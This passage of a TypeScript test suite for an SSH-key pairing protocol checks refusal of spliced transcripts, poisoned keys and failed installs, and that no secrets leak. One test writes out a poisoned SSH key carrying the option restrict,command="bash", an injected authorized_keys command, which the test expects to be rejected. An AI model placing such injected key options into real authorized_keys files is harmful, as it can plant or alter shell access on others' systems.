      return Response.json({ payload, mac: await macResponse(key, payload) });
    });

    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: 'ZZZZ-ZZZZ-ZZZZ', host: '127.0.0.1', port });
    expect(out.reason).toBe('bad-response');
    expect(initiator.applied).toHaveLength(0);
  });

  test('a response not bound to this request is refused (transcript splice)', async () => {
    const rogue = await bundle(SELF);
    const { port } = serve(async () => {
      const key = await deriveCodeKey('ZZZZZZZZZZZZ');
      // Correct key, correct shape, but reqSha256 is from some other exchange.
      const payload = {
        v: 1 as const,
        from: rogue,
        tsMs: 1_700_000_000_000,
        reqSha256: new Bun.CryptoHasher('sha256').update('some other request').digest('base64'),
      };
      return Response.json({ payload, mac: await macResponse(key, payload) });
    });

    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: 'ZZZZ-ZZZZ-ZZZZ', host: '127.0.0.1', port });
    expect(out.reason).toBe('bad-response');
    expect(initiator.applied).toHaveLength(0);
  });

  test('a correctly MACd response carrying a poisoned key is still refused', async () => {
    const poisoned = await bundle(SELF, { sshPublicKey: `restrict,command="bash" ${sshEd25519(0x11)}` });
    const { port } = serve(async (req) => {
      const req_ = (await req.json()) as { payload: unknown };
      const key = await deriveCodeKey('ZZZZZZZZZZZZ');
      const payload = {
        v: 1 as const,
        from: poisoned,
        tsMs: 1_700_000_000_000,
        reqSha256: new Bun.CryptoHasher('sha256').update(canonicalJson(req_.payload)).digest('base64'),
      };
      return Response.json({ payload, mac: await macResponse(key, payload) });
    });

    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: 'ZZZZ-ZZZZ-ZZZZ', host: '127.0.0.1', port });
    expect(out.reason).toBe('bad-response');
    expect(initiator.applied).toHaveLength(0);
  });

  test('a failure to install the verified peer is reported as half-paired, not as success', async () => {
    const { h: target, port } = await responder();
    const minted = target.pairing.mintCode();

    const initiator = harness(PEER, await bundle(PEER), {
      applyPeer: async () => {
        throw new Error('config write failed');
      },
    });
    const out = await initiator.pairing.redeem({ code: minted.display, host: '127.0.0.1', port });

    expect(out.ok).toBe(false);
    expect(out.reason).toBe('half-paired');
    // The other side did install us and did burn the code -- which is exactly what the reason names.
    expect(target.applied).toHaveLength(1);
    expect(target.pairing.codeState().active).toBe(false);
    expect(initiator.audits).toHaveLength(0);
  });

  test('a responder that cannot install the peer returns 500 and pairs nobody', async () => {
    const target = harness(SELF, await bundle(SELF), {
      rand: fixedRand,
      applyPeer: async () => {
        throw new Error('authorized_keys is read-only');
      },
    });
    const { port } = serve((req) => target.pairing.handleHello(req));
    const minted = target.pairing.mintCode();

    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: minted.display, host: '127.0.0.1', port });

    expect(out.reason).toBe('bad-response');
    expect(initiator.applied).toHaveLength(0);
    expect(target.audits).toHaveLength(0);
    // Still one-shot: the code was burned the moment the MAC verified.
    expect(target.pairing.codeState().active).toBe(false);
  });
});

describe('the module never records secret material', () => {
  test('the audit detail for a pairing carries only the pinned three fields', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    await h.pairing.handleHello(helloRequest(await helloBody(FIXED_CODE, await bundle(PEER), 1_700_000_000_000)));

    expect(Object.keys(h.audits[0]!.detail).sort()).toEqual(['mode', 'peerMachine', 'sshKeyFingerprint']);
    expect(canonicalJson(h.audits[0]!.detail)).not.toContain(FIXED_CODE);
  });

  test('a refusal response body never echoes the code or the peer bundle', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const res = await h.pairing.handleHello(
      helloRequest(await helloBody('AAAAAAAAAAAA', await bundle(PEER), 1_700_000_000_000)),
    );
    const text = await res.text();
    expect(text).toBe(JSON.stringify({ error: 'unauthorized' }));
    expect(text).not.toContain(FIXED_CODE);
  });
});
